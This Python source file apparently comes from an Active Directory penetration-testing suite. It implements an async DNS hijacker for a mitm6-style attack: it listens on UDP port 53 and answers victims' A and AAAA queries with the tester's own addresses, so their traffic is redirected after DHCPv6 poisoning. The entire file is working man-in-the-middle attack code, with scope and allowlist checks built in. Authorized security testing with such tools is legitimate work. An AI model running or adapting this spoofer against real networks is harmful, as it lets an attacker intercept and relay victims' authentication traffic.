"""Async DNS hijacker that answers A/AAAA pointing victims at us.

Once the DHCPv6 poisoner advertises us as the DNS server, victims send
queries to our IPv6 link-local socket on UDP/53.  This module binds a
plain ``asyncio`` datagram endpoint on UDP/53 (both IPv4 and IPv6 so the
suite also catches strays that fall back) and replies with our IPs to
queries that pass the allowlist/blocklist filter.

We deliberately do **not** depend on scapy here — DNS is a normal L4
exchange once the client has chosen us as a server, so a vanilla
asyncio ``DatagramProtocol`` is the right primitive.  Keeping scapy's
blast radius confined to the L2 layer makes the suite easier to test
and reason about.

Public surface
--------------
* ``DNSHijacker.start()`` / ``stop()`` — async lifecycle.
* ``build_dns_response()`` — pure helper, exposed for unit tests so we
  validate the wire format without binding sockets.
"""

from __future__ import annotations

import asyncio
import contextlib
import socket
import struct
from typing import Any

from adscan_internal.rich_output import print_info_debug
from adscan_internal.services.mitm6.core import (
    victim_address_in_asset_scope,
    DNSObservation,
    MITM6Callback,
    MITM6Config,
    matches_filter,
)


# ---------------------------------------------------------------------------
# DNS wire format helpers (RFC 1035) — only the slivers we need
# ---------------------------------------------------------------------------

_QTYPE_A = 1
_QTYPE_AAAA = 28
_QCLASS_IN = 1
_RESPONSE_FLAGS = 0x8180  # QR=1, RD=1, RA=1


def _decode_qname(data: bytes, offset: int) -> tuple[str, int]:
    """Decode a DNS qname starting at ``offset``.  No compression support."""

    labels: list[str] = []
    pos = offset
    while pos < len(data):
        length = data[pos]
        if length == 0:
            return ".".join(labels), pos + 1
        if length & 0xC0:
            raise ValueError("DNS compression not expected in queries")
        pos += 1
        if pos + length > len(data):
            raise ValueError("truncated DNS label")
        labels.append(data[pos : pos + length].decode("ascii", errors="replace"))
        pos += length
    raise ValueError("DNS qname not terminated")


def _encode_qname(name: str) -> bytes:
    out = bytearray()
    for label in name.split("."):
        if not label:
            continue
        encoded = label.encode("ascii", errors="replace")
        if len(encoded) > 63:
            raise ValueError(f"DNS label too long: {label!r}")
        out.append(len(encoded))
        out.extend(encoded)
    out.append(0)
    return bytes(out)


def parse_dns_query(data: bytes) -> tuple[int, str, int] | None:
    """Return ``(transaction_id, qname, qtype)`` or ``None`` if unparsable."""

    if len(data) < 12:
        return None
    try:
        tid, flags, qd, _an, _ns, _ar = struct.unpack_from(">HHHHHH", data, 0)
    except struct.error:
        return None
    if flags & 0x8000:
        return None  # already a response
    if qd != 1:
        return None
    try:
        qname, pos = _decode_qname(data, 12)
        qtype, qclass = struct.unpack_from(">HH", data, pos)
    except (ValueError, struct.error):
        return None
    if qclass != _QCLASS_IN:
        return None
    return tid, qname.rstrip("."), qtype


def build_dns_response(
    *,
    transaction_id: int,
    qname: str,
    qtype: int,
    rdata: bytes,
    ttl: int = 60,
) -> bytes:
    """Build a single-answer DNS response with no compression."""

    header = struct.pack(">HHHHHH", transaction_id, _RESPONSE_FLAGS, 1, 1, 0, 0)
    encoded_name = _encode_qname(qname)
    question = encoded_name + struct.pack(">HH", qtype, _QCLASS_IN)
    answer = (
        encoded_name
        + struct.pack(">HHIH", qtype, _QCLASS_IN, ttl, len(rdata))
        + rdata
    )
    return header + question + answer


# ---------------------------------------------------------------------------
# Hijacker
# ---------------------------------------------------------------------------

class _DNSDatagramProtocol(asyncio.DatagramProtocol):
    """Bridge from asyncio.DatagramProtocol into the hijacker."""

    def __init__(self, hijacker: "DNSHijacker") -> None:
        self._hijacker = hijacker
        self._transport: asyncio.DatagramTransport | None = None

    def connection_made(self, transport):
        self._transport = transport  # type: ignore[assignment]

    def datagram_received(self, data: bytes, addr: tuple) -> None:  # type: ignore[override]
        if self._transport is None:
            return
        reply = self._hijacker._build_reply_for(data, addr)
        if reply is not None:
            with contextlib.suppress(OSError):
                self._transport.sendto(reply, addr)


class DNSHijacker:
    """Listen on UDP/53 (IPv4 + IPv6) and spoof A/AAAA replies."""

    def __init__(
        self,
        config: MITM6Config,
        observation_callback: MITM6Callback = None,
    ) -> None:
        self._config = config
        self._observation_callback = observation_callback
        self._transports: list[asyncio.DatagramTransport] = []
        self._loop: asyncio.AbstractEventLoop | None = None

    async def start(self) -> None:
        """Bind UDP/53 IPv4 and IPv6 (link-local-scoped)."""

        self._loop = asyncio.get_event_loop()
        await self._bind_v4()
        await self._bind_v6()

    async def stop(self) -> None:
        """Close every transport (best-effort)."""

        for transport in self._transports:
            with contextlib.suppress(Exception):
                transport.close()
        self._transports.clear()

    # -- bind helpers -----------------------------------------------------

    async def _bind_v4(self) -> None:
        if self._config.our_ipv4 is None:
            return
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.setblocking(False)
        sock.bind((self._config.our_ipv4, 53))
        transport, _ = await self._loop.create_datagram_endpoint(  # type: ignore[union-attr]
            lambda: _DNSDatagramProtocol(self), sock=sock
        )
        self._transports.append(transport)
        print_info_debug(
            f"[mitm6-dns] listening on {self._config.our_ipv4}:53 (v4)"
        )

    async def _bind_v6(self) -> None:
        if self._config.our_ipv6_linklocal is None:
            return
        sock = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.setblocking(False)
        # IPv6 link-local needs %iface scope to bind correctly.
        scoped_addr = f"{self._config.our_ipv6_linklocal}%{self._config.interface_name}"
        addrinfo = socket.getaddrinfo(
            scoped_addr, 53, socket.AF_INET6, socket.SOCK_DGRAM
        )
        sock.bind(addrinfo[0][4])
        transport, _ = await self._loop.create_datagram_endpoint(  # type: ignore[union-attr]
            lambda: _DNSDatagramProtocol(self), sock=sock
        )
        self._transports.append(transport)
        print_info_debug(
            f"[mitm6-dns] listening on [{self._config.our_ipv6_linklocal}]:53 (v6)"
        )

    # -- reply construction ----------------------------------------------

    def _build_reply_for(self, data: bytes, addr: tuple) -> bytes | None:
        parsed = parse_dns_query(data)
        if parsed is None:
            return None
        tid, qname, qtype = parsed
        victim_ip = addr[0]
        if not victim_address_in_asset_scope(victim_ip):
            return None
        if not matches_filter(
            qname,
            allowlist=self._config.dns_allowlist,
            blocklist=self._config.dns_blocklist,
        ):
            return None

        if qtype == _QTYPE_A:
            if self._config.our_ipv4 is None:
                return None
            rdata = socket.inet_pton(socket.AF_INET, self._config.our_ipv4)
            answer_label = self._config.our_ipv4
        elif qtype == _QTYPE_AAAA:
            if self._config.our_ipv6_linklocal is None:
                return None
            rdata = socket.inet_pton(
                socket.AF_INET6, self._config.our_ipv6_linklocal
            )
            answer_label = self._config.our_ipv6_linklocal
        else:
            return None

        reply = build_dns_response(
            transaction_id=tid, qname=qname, qtype=qtype, rdata=rdata
        )
        self._emit(
            DNSObservation(
                qname=qname,
                qtype="A" if qtype == _QTYPE_A else "AAAA",
                victim_ip=victim_ip,
                answer=answer_label,
            )
        )
        return reply

    def _emit(self, observation: DNSObservation) -> None:
        cb = self._observation_callback
        loop = self._loop
        if cb is None or loop is None:
            return
        # Already on the loop thread (DatagramProtocol callback) — schedule directly.
        with contextlib.suppress(Exception):
            asyncio.ensure_future(cb(observation), loop=loop)


__all__ = [
    "DNSHijacker",
    "build_dns_response",
    "parse_dns_query",
]


# Quiet linter: ``Any`` import shows up unused; keep the alias around for
# subclasses that introspect the protocol.
_ = Any
